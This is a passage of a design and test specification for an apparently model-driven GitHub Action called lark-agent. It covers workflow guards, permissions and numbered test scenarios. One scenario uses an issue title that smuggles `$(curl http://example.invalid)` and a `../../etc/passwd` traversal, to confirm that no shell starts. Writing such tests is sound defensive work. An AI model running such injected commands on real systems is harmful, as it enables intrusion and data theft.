`notify-style.md` must contain a heading `Skip` and a heading `Send` so tests
can pin skip vs send with a fake model plus the file bytes.

`title-rules.md` must contain `max 72` so GW-10 can be judged.

`merge-check.md` must contain `lark-agent-gate` and `do not merge`.

## Example workflows

Live prefix `.github/workflows/`. Twins under `examples/github-agent/workflows/`.
`uses: ./`. Checkout:

```yaml
- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.repository.default_branch }}
    persist-credentials: false
```

Forbidden anywhere in live and example YAML (`SC-66`, `SC-67`):
`pull_request_target`, `download-artifact`,
`github.event.pull_request.head.sha` as checkout `ref`,
`persist-credentials: true`.

Every job that uses the Action with Lark or `OPENAI_API_KEY`:
`environment: lark-production` (`SC-68`), `timeout-minutes: 10`.

Fork guard on `pull_request` jobs (`SC-38`):

```text
github.event.pull_request.head.repo.full_name == github.repository
```

Draft guard:

```text
github.event.pull_request.draft == false
```

Comment `if` (`GW-01`):

```text
contains(github.event.comment.body, '@lark-agent')
&& github.event.comment.user.type != 'Bot'
&& (github.event.comment.author_association == 'OWNER'
    || github.event.comment.author_association == 'MEMBER'
    || github.event.comment.author_association == 'COLLABORATOR')
```

| Id | Live file | `on` | extra `if` | `allowed_actions` | prompt |
|---|---|---|---|---|---|
| GW-01 | `lark-agent-comment.yml` | `issue_comment` + `pull_request_review_comment` types `[created]` | comment if | `post_github_comment` | `ask.md` |
| GW-02.1 | same | same | slash via parser | union check if PR | `review.md` appended by slash |
| GW-02.2 | `lark-agent-review-dispatch.yml` | `workflow_dispatch` input `pr_number` (string, required) | | `post_github_comment,upsert_github_check` | `review.md` |
| GW-03 | `lark-agent-pr-review.yml` | `pull_request` types `[opened, labeled]` | not draft; same-repo; skip `synchronize`; labeled `lark-agent-review` may run | `post_github_comment,upsert_github_check` | `review.md` |
| GW-04 | `lark-agent-event-summary.yml` | `issues` types `[opened]`; `pull_request` types `[opened]`; `workflow_run` types `[completed]` | workflow_run: `github.event.workflow_run.name != 'CI'` (`SC-69`) | `send_lark_message` | `event-summary.md` |
| GW-05 | `lark-agent-master-changelog.yml` | `push` branches `[master]` | | `send_lark_message` | `changelog.md` |
| GW-06 | `lark-agent-release.yml` | `workflow_dispatch` | jobs chained | `write_job_output` then ordinary notify | `release-notes.md` |
| GW-07 | `lark-agent-pr-summary.yml` | `pull_request` types `[opened]` | not draft; same-repo | `post_github_comment` | `pr-summary.md` |
| GW-08 | `lark-agent-merge-check.yml` | `pull_request` types `[opened]` | not draft; same-repo | `upsert_github_check` | `merge-check.md` |
| GW-09 | `lark-agent-notify-style.yml` | same as GW-04 including CI exclusion | | `send_lark_message` | `notify-style.md` |
| GW-10 | `lark-agent-title.yml` | `issues` `[opened]`, `pull_request` `[opened]` | not draft for PRs | `update_github_issue_title` | `title-rules.md` |

GW-03.2: `on.pull_request.types` must **not** include `synchronize`. The
`labeled` type runs when label `lark-agent-review` is added (`GW-03.3`).

GW-06 jobs, in order:

1. `notes`: `mode: run`, `allowed_actions: write_job_output`, writes
   `changelog`.
2. `verify`: `needs: notes`, `make verify`, no Action.
3. `release`: `needs: verify`, `if: success()`, `permissions: contents: write`,
   creates a **draft** GitHub Release using `changelog` output. Must not merge.
   Tests parse YAML `if` and assert no `github run` in this job; a unit test
   with fake HTTP asserts verify failure → zero `POST /repos/.../releases`.
4. `notify`: ordinary `mode: notify` (default), `if: success()`.

Permissions minimums (`SC-65`):

| Job need | `permissions` |
|---|---|
| comments | `issues: write`, `pull-requests: write`, `contents: read` |
| checks | `checks: write`, `contents: read`, `pull-requests: read` |
| title | `issues: write`, `pull-requests: write`, `contents: read` |
| Lark-only | `contents: read` |
| draft release | `contents: write` on that job only |
| notify | same as current `lark-notify.yml` |

`github.token` is the GitHub token input. Lark and model secrets come from
`lark-production`.

YAML tests load every live workflow plus every example twin and assert the
forbidden keys, checkout `ref` / `persist-credentials`, environment name,
comment `if` fragments, and GW-03.2 / GW-04 CI exclusion.

### Scenario Then clauses

**GW-01.** Parser SC-06; one issue comment unless dry-run; no check HTTP.

**GW-02.1.** Parser SC-07; effective allowlist contains
`post_github_comment` and `upsert_github_check`; review prompt appended.

**GW-02.2.** `pull_request_number=12` from inputs, not from model args.

**GW-03.1.** No slash command; review prompt; check upsert allowed.

**GW-03.2.** Workflow file must not list `synchronize` in `types`.

**GW-03.3.** `labeled` is in `types`.

**GW-04.** At most one Lark send to configured chat; HMAC footer present when
sent; never a second chat id.

**GW-05.** Injected reference has `before_sha` and `head_sha`; missing compare
→ `partial` true and no invented commits (fake compare 404).

**GW-06.** `data.outputs.changelog` is a non-empty string on the notes job
success path; verify failure YAML `if: success()` on release job.

**GW-07.** One PR issue comment.

**GW-08.1.** Check name `lark-agent-gate`; zero merge paths.

**GW-08.2.** `/check` allowlist includes upsert.

**GW-09.1.** Fake model `submit_decision` `skipped=true` → zero Lark HTTP,
`data.skipped=true`, exit 0.

**GW-09.2.** Fake model calls `send_lark_message` once.

**GW-10.1.** One title PATCH.

**GW-10.2.** Fake model `record` without the title tool → zero PATCH.

**GW-10.3.** `/title` unions `update_github_issue_title`.

## Test map

| Area | Location | Scenes |
|---|---|---|
| ParseEvent + fixtures | `internal/github/*_test.go` | SC-02, SC-13, SC-29, SC-30, SC-48, SC-55–SC-57, SC-72 |
| Mention parser | package next to GitHub support | SC-06–SC-09, SC-17, SC-23–SC-27, SC-43–SC-47, SC-74–SC-76 |
| CLI / no WebSocket / envelope | `agent/cmd` + `integration_test/lark_agent` | SC-01, SC-03, SC-11, SC-14, SC-15, SC-18, SC-19, SC-35, SC-54, SC-81, SC-82 |
| Tools + fake HTTP | `agent/tools` + `internal/github` | SC-04, SC-05, SC-10, SC-12, SC-21, SC-22, SC-31–SC-33, SC-39–SC-42, SC-49, SC-50, SC-58, SC-62, SC-63 |
| Workflow YAML | `integration_test/lark_agent` | GW-03.2, SC-38, SC-65–SC-69, SC-83 |
| Help | `help_contract_test.go` | SC-51 |
| Action dispatcher | unit test of mode switch / Dockerfile assertion | SC-34, SC-52, SC-53 |

Tests use only synthetic identifiers (`example/widgets`, `oc_synthetic`,
`cli_synthetic`, `ou_owner`).

## Runtime scenes (`SC-01` … `SC-80`)

- **SC-01.** Given `run` or `github run` starts, when Lark is initialized, then
  no SDK WebSocket client is constructed.
- **SC-02.** Given `GITHUB_EVENT_NAME=fork`, when `github run` starts, then
  exit 2, no model, stderr message contains `unsupported github event`.
- **SC-03.** Given a valid `workflow_run` fixture and `--dry-run`, when
  `github run` executes, then exit 0, stdout envelope `ok=true`,
  `data.mode=run`, `data.dry_run=true`, `data.event_name=workflow_run`,
  `data.allowed_actions=[]`, zero mutating HTTP.
- **SC-04.** Given effective allowlist omits `update_github_issue_title`, when
  the model calls that tool, then typed denial, zero PATCH.
- **SC-05.** Given a tool argument includes `repository` or `chat_id`, when
  executed, then denial containing `invalid`, zero HTTP.
- **SC-06 … SC-09, SC-23 … SC-27, SC-08b, SC-43 … SC-47, SC-74 … SC-76.**
  Parser table above.
- **SC-10.** Given dry-run, when the model calls `post_github_comment`, then
  denial, zero POST.
- **SC-11.** Given no `OPENAI_API_KEY` and no Keychain model key, when `run`
  starts, then exit 2, zero GitHub writes, stderr contains `model`.
- **SC-12.** Given merge-check allowlist, when the process runs, then check
  upsert paths only; a fake transport seeing `/merge` fails the test.
- **SC-13.** Given each supported event fixture with required ids, when
  `ParseEvent` runs, then `Validate` succeeds.
- **SC-14.** Given `--not-a-real-flag`, when `github run` starts, then
  non-zero, empty stdout, no model, stderr contains `unknown flag` or
  `unknown`.
- **SC-15.** Given empty event path and name, when `github run` starts, then
  exit 2, no model, message contains `GITHUB_EVENT_PATH and GITHUB_EVENT_NAME are required`.
- **SC-16.** Given event repo `other/other` and allowlist `example/widgets`,
  then exit 2, no model, message contains `github repository is not allowed`.
- **SC-17.** Given comment body without whole-token `@lark-agent`, when
  `github run` runs, then exit 0, `data.skipped=true`, no model, zero writes.
- **SC-18.** Given missing `--prompt-file` and empty `--message`, then exit 2,
  no model, message contains `prompt`.
- **SC-19.** Given daemon state path P, when `github run` uses default `--state`,
  then P is not opened (file mtime/size unchanged).
- **SC-20.** Given a parsed event, when the first model request is sent, then
  the request bytes contain `github_event_summary` and the repository
  `example/widgets`.
- **SC-21.** Given `--allowed-actions=merge`, then exit 2 before model, message
  contains `unknown allowed action`.
- **SC-22.** Given secret env values `must-not-appear`, when dry-run succeeds
  or a write is attempted with that substring in `body`, then the secret does
  not appear in stdout/stderr; the write is rejected.
- **SC-28.** Given `/review` on a non-PR issue and comments allowed, then one
  comment containing `pull request`, zero check HTTP, exit 0.
- **SC-29.** Given `workflow_run` JSON without `workflow_run.id`, then parse
  fail, no model.
- **SC-30.** Given `push` JSON without `repository.full_name`, then parse fail.
- **SC-31.** Given a model-equivalent merge URL, when write tools run, then
  that path is not requested.
- **SC-32.** Given `conclusion=cancelled`, then no HTTP.
- **SC-33.** Given `write_job_output` `name=notes`, then no file write.
- **SC-34.** Given Action mode `other`, then exit 2, stderr contains
  `unknown mode`.
- **SC-35.** Given success, when stdout is decoded with
  `DisallowUnknownFields` on the envelope and on `data`, then decode succeeds.
- **SC-38.** Given example/live `pull_request` workflows, when YAML is parsed,
  then the same-repo `if` fragment is present.
- **SC-39.** Given a successful `send_lark_message`, when the Lark body is
  inspected, then it contains `[lark-agent-github-ref:v1:` and verifies with
  the app secret; idempotency key starts with `ghs-`.
- **SC-40.** Given `submit_decision` `decision=reply`, then tool error; zero
  Lark IM from that tool.
- **SC-41.** Given a second `post_github_comment` in the same process, then
  denial, exactly one POST recorded.
- **SC-42.** Given changelog value containing a line `LARK_AGENT_EOF`, then
  `write_job_output` fails.
- **SC-48.** Given issue title `$(curl http://example.invalid); ../../etc/passwd`,
  when parsed, then `title` equals that string and no shell starts.
- **SC-49.** Given check upsert POST/PATCH body, then `name` is
  `lark-agent-gate`.
- **SC-50.** Given `github run` registry, when listed, then it does not contain
  `shell` or `write_workspace`.
- **SC-51.** Given `github run --help` and `run --help`, then the listed
  substrings are present.
- **SC-52.** Given `Dockerfile`, when read, then it does not use
  `ENTRYPOINT ["/usr/local/bin/lark-agent", "github", "notify"]`.
- **SC-53.** Given `action.yml`, then input `mode` default is `notify` and env
  includes `LARK_AGENT_MODE`.
- **SC-54.** Given current `lark-notify.yml` without `mode`, then dispatcher
  still runs ordinary notify (test: mode default + notify help/args).
- **SC-55.** Given `issue_comment` with `issue.pull_request`, then kind is
  `pull_request` and `pull_request_number` is the issue number.
- **SC-56.** Given `workflow_dispatch` `inputs.pr_number="12"`, then
  `pull_request_number=12`.
- **SC-57.** Given push `before` 40 zeros, then parse succeeds and
  `before_sha` is those zeros.
- **SC-58.** Given `get_github_file` `path=../secret`, then denial, no HTTP.
- **SC-59.** Given effective `send_lark_message` without chat id and not
  dry-run, then exit 2, message contains `--chat-id is required`.
- **SC-60.** Given `get_lark_context` `chat_id` other than configured, then
  `SC-05` denial.
- **SC-61.** Given a model that never calls valid `submit_decision` `record` and
  a terminal finalizer that also returns no valid `record`, when max turns
  exhausted, then exit 1, empty stdout.
- **SC-62.** Given check `title` of 256 `a` characters, then no HTTP.
- **SC-63.** Given comment `body` of 65537 bytes, then no HTTP.
- **SC-65.** Given each live workflow, when `permissions` is parsed, then it
  matches the minimum table (no `contents: write` except GW-06 release job).
- **SC-66.** Given all workflow files under `.github/workflows/` and
  `examples/github-agent/`, then none contain `pull_request_target`.
- **SC-67.** Given checkout steps, then `persist-credentials` is `false` and
  `ref` is `github.event.repository.default_branch`.
- **SC-68.** Given jobs that pass Lark/model secrets, then
  `environment: lark-production`.
- **SC-69.** Given GW-04/GW-09 YAML, then a `workflow_run` job `if` contains
  `!= 'CI'` or `!= \"CI\"`.
- **SC-70.** Given `github notify --dry-run` regression, then envelope still
  has `ok` and `data.message_type=post`.
- **SC-71.** Given event name `check_suite`, then `SC-02`.
- **SC-72.** Given `issue_comment` without `comment.id`, then parse fail.
- **SC-73.** Given the review-comment fixture, then kind `pull_request` and
  `comment_id=2002`.
- **SC-77.** Given `--allowed-actions=" post_github_comment , send_lark_message "`,
  then effective names are those two without spaces.
- **SC-78.** Given empty `--allowed-actions` and no slash extras, then write
  tools deny.
- **SC-79.** Given `GITHUB_ACTIONS=true` and `GITHUB_REPOSITORY=example/widgets`
  but event repo `other/other`, then `SC-16`.
- **SC-80.** Given `get_github_context` `sections=["nope"]`, then tool error
  containing `unsupported github section`, no HTTP.
- **SC-81.** Given a loop model that keeps returning an invalid terminal
  `submit_decision` until terminal-only attempts are exhausted, when the
  terminal finalizer returns `record`, then exit 0, envelope `ok`, zero writes,
  and a dry run stays a dry run.
- **SC-82.** Given `model.roles.finalizer` naming a profile that does not exist,
  when the smart command starts, then exit 2 before any model call, message
  contains `model role finalizer references missing profile`.
- **SC-83.** Given every workflow file under `.github/workflows/` and
  `examples/github-agent/` that triggers on `workflow_run`, then it declares a
  non-empty `workflows` list.

`SC-36` is unused (reserved). `SC-37` is covered by the comment `if` Bot
clause in YAML tests.

## Non-goals (behavior must not appear)

- Second Lark WebSocket
- Model-selected arbitrary GitHub API, merge, delete, permission changes
- Executing PR head, artifacts, or raw job logs
- Interactive cards or native approval wait
- Mapping GitHub commenters to daemon Owner
- Changing daemon group permission rules
- Comment flags other than `--dry-run`
- Slash commands `/ask`, `/summarize`, `/changelog`, `/notify`
- Calling GitHub Secrets or Variables REST APIs
